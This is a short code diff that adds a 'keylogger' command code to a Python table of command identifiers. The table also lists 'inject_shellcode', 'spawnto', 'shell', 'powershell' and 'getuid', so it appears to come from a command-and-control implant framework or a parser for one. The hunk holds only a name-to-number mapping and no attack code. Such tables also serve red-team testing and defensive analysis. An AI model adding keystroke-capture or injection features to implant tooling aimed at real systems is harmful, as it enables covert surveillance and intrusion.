@@ -33,6 +33,7 @@ commands = {
     "spawnto": 0x55,
     "inject_shellcode": 0x56,
     # "register_process_inject_kit": 0x57,
+    "keylogger": 0x58,
     "shell": 0x60, 
     "powershell": 0x61, 
     "getuid": 0x70, 
